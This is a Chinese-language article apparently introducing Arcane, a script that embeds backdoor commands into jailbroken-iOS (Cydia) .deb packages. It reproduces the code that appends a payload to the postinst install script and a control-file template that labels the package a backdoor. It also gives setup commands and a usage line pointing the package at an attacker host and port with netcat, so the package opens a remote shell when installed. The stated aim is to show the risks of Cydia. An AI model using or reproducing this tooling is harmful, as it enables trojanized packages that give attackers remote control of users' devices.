![](https://image.3001.net/images/20200814/1597388100.jpg!small)

## Arcane

Arcane是一个针对iOS包（iphone-arm）的安全工具，本质上来说Arcane是一个简单小巧的脚本，可以帮助广大研究人员针对APT存储库创建必要的资源。该工具的主要目的是为了让大家明白为什么使用Cydia是一种非常危险的行为，因为网络犯罪分子能够通过iOS包来对存在安全风险的iOS设备执行后渗透攻击。

## Arcane工作机制

为了帮助大家了解Arcane工作机制背后的工作机制，我们首先解压一个由Arcane创建的iOS包：

    
    
    dpkg-deb -R /tmp/cydia/whois_5.3.2-1_iphoneos-arm_BACKDOORED.deb /tmp/whois-decomp

这里，需要注意DEBIAN目录下的control文件和postinst文件，这两个文件都非常重要：

    
    
    tree /tmp/whois-decomp/
    
    /tmp/whois-decomp/
    
    ├── DEBIAN
    
    │   ├── control
    
    │   └── postinst
    
    └── usr
    
        └── bin
    
            └── whois

在Arcane的帮助下，我们可以直接在安装或移除应用程序的过程中，将恶意脚本轻松嵌入到一个iOS包中。这里支持的[
_包维护脚本_](https://www.debian.org/doc/debian-policy/ch-maintainerscripts.html)支持[
_preinst、postinst、prerm和postrm文件_](https://wiki.debian.org/MaintainerScripts)。Arcane可以利用postinst文件来在iOS包的安装过程中执行任意命令。

下面给出的是“post-installation”文件的样例。这个文件可以在安装应用程序包之后，在目标设备中执行命令。攻击者可以利用该文件来管理或维护安装过程中的各种操作，而Arcane可以利用这种功能来向iOS包中注入恶意Bash命令。

    
    
    postinst="$tmp/DEBIAN/postinst";
    
    # A function to handle the type of command execution embedded into the
    
    # postinst file.
    
    function inject_backdoor ()
    
    {
    
        # If --file is used, `cat` the command(s) into the postinst file.
    
        if [[ "$infile" ]]; then
    
            cat "$infile" >> "$postinst";
    
            embed="[$infile]";
    
        else
    
            # If no --file, utilize the simple Bash payload, previously
    
            # defined.
    
            echo -e "$payload" >> "$postinst";
    
            embed="generic shell command";
    
        fi;
    
        status "embedded $embed into postinst" "error embedding backdoor";
    
        chmod 0755 "$postinst"
    
    };

在iOS包安装过程中，包管理工具将会使用control文件中包含的值。Arcane将能够修改已有的[
_control文件_](https://www.debian.org/doc/debian-policy/ch-controlfields.html)或创建一个新的control文件。下面给出的是control文件样本，大多数iOS包都会包含一个control文件。在这里，Arcane将会使用下面给出的这个control文件样本，其中的“$hacker”变量用于实现任意数据占位。

    
    
    # https://www.debian.org/doc/manuals/maint-guide/dreq.en.html
    
    controlTemp="Package: com.$hacker.backdoor
    
    Name: $hacker backdoor
    
    Version: 1337
    
    Section: app
    
    Architecture: iphoneos-arm
    
    Description: A backdoored iOS package
    
    Author: $hacker <https://$hacker.github.io/>
    
    Maintainer: $hacker <https://$hacker.github.io/>";
    ..
    
    # An `if` statement to check for the control file.
    
    if [[ ! -f "$tmp/DEBIAN/control" ]]; then
    
        # If no control is detected, create it using the template.
    
        echo "$controlTemp" > "$tmp/DEBIAN/control";
    
        status "created control file" "error with control template";
    
    else
    
        # If a control file exists, Arcane will simply rename the package
    
        # as it appears in the list of available Cydia applications. This
    
        # makes the package easier to location in Cydia.
    
        msg "detected control file" succ;
    
        sed -i '0,/^Name:.*/s//Name: $hacker backdoor/' "$tmp/DEBIAN/control";
    
        status "modified control file" "error with control";
    
    fi;

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/tokyoneon/Arcane.git

## 工具使用

我们建议广大用户在Kaili v2020.3版本的操作系统中使用Arcane。工具配置和使用命令如下：

    
    
    sudo apt-get update; sudo apt-get install -Vy bzip2 netcat-traditional dpkg coreutils # dependencies
    
    sudo git clone https://github.com/tokyoneon/arcane /opt/arcane
    
    sudo chown $USER:$USER -R /opt/arcane/; cd /opt/arcane
    
    chmod +x arcane.sh;./arcane.sh --help

接下来，我们可以使用下列命令来将恶意控制指令嵌入到一个给定的iOS包中：

    
    
    ./arcane.sh --input samples/sed_4.5-1_iphoneos-arm.deb --lhost <attacker> --lport <4444> --cydia --netcat

如需获取更加详细的使用指引，可以参考这篇【[ _手册_](1%E3%80%81https%3A/null-byte.wonderhowto.com/how-to/hacking-ios-embed-payloads-into-iphone-packages-with-arcane-0325421/)】。

## iOS包样例

Arcane的代码库中提供了下列iOS包以供广大研究人员进行测试：

    
    
    ls -la samples/
    
    -rw-r--r-- 1 root root 100748 Jul 17 18:39 libapt-pkg-dev_1.8.2.1-1_iphoneos-arm.deb
    
    -rw-r--r-- 1 root root 142520 Jul 22 06:21 network-cmds_543-1_iphoneos-arm.deb
    
    -rw-r--r-- 1 root root  76688 Aug 29  2018 sed_4.5-1_iphoneos-arm.deb
    
    -rw-r--r-- 1 root root  60866 Jul  8 21:03 top_39-2_iphoneos-arm.deb
    
    -rw-r--r-- 1 root root  13810 Aug 29  2018 whois_5.3.2-1_iphoneos-arm.deb

### 下面给出的是iOS样例包的MD5：

    
    
    md5sum samples/*.deb
    
    3f1712964701580b3f018305a55e217c  samples/libapt-pkg-dev_1.8.2.1-1_iphoneos-arm.deb
    
    795ccf9c6d53dd60d2f74f7a601f474f  samples/network-cmds_543-1_iphoneos-arm.deb
    
    a020882dac121afa4b03c63304d729b0  samples/sed_4.5-1_iphoneos-arm.deb
    
    38db275007a331e7ff8899ea22261dc7  samples/top_39-2_iphoneos-arm.deb
    
    b40ee800b72bbac323568b36ad67bb16  samples/whois_5.3.2-1_iphoneos-arm.deb

## 项目地址

Arcane：【[ _GitHub传送门_](https://github.com/tokyoneon/Arcane)】

## 参考资料

> [ _https://null-byte.wonderhowto.com/how-to/hacking-ios-embed-payloads-into-> iphone-packages-with-arcane-0325421/_](https://null-> byte.wonderhowto.com/how-to/hacking-ios-embed-payloads-into-iphone-packages-> with-arcane-0325421/)
>
> [ _https://apt.bingner.com/_](https://apt.bingner.com/)

  

